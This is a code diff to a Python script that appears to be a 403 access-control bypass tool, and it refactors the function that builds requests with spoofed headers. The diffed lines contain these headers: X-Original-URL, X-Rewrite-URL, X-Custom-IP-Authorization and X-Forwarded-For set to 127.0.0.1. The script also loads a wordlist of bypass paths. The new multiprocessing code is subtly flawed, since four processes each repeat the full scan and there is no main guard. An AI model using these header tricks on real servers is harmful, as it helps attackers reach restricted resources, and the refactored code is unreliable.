@@ -1,6 +1,6 @@
 from colorama import Fore, Back, Style
 from fake_useragent import UserAgent
-import threading
+import multiprocessing
 import requests
 import argparse
 import sys
@@ -52,24 +52,14 @@ def word_list(wordlist: str) -> list:
 
 
 def header_bypass(path=None):
-    if path:
-        headers = [
-            {'User-Agent': str(ua.chrome)},
-            {'User-Agent': str(ua.chrome), 'X-Original-URL': path},
-            {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
-            {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
-            {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
-            {'User-Agent': str(ua.chrome), 'X-rewrite-url': path}
-        ]
-    else:
-        headers = [
-            {'User-Agent': str(ua.chrome)},
-            {'User-Agent': str(ua.chrome), 'X-Original-URL': '/'},
-            {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
-            {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
-            {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
-            {'User-Agent': str(ua.chrome), 'X-rewrite-url': '/'}
-        ]
+    headers = [
+        {'User-Agent': str(ua.chrome)},
+        {'User-Agent': str(ua.chrome), 'X-Original-URL': path if path else '/'},
+        {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
+        {'User-Agent': str(ua.chrome), 'X-rewrite-url': path if path else '/'}
+    ]
     return headers
 
 
@@ -96,7 +86,7 @@ def do_request(url: str, stream=False, path=None):
         pass
 
 
-def start():
+def main():
     bypass_list = word_list('bypasses.txt')
     if args.domains:
         if args.path:
@@ -126,5 +116,10 @@ def start():
                 links = args.target + bypass
                 do_request(links)
 
-t = threading.Thread(target=start)
-t.start()
+processes = []
+for _ in range(4):
+    process = multiprocessing.Process(target=main)
+    process.start()
+    processes.append(process)
+for process in processes:
+    process.join()
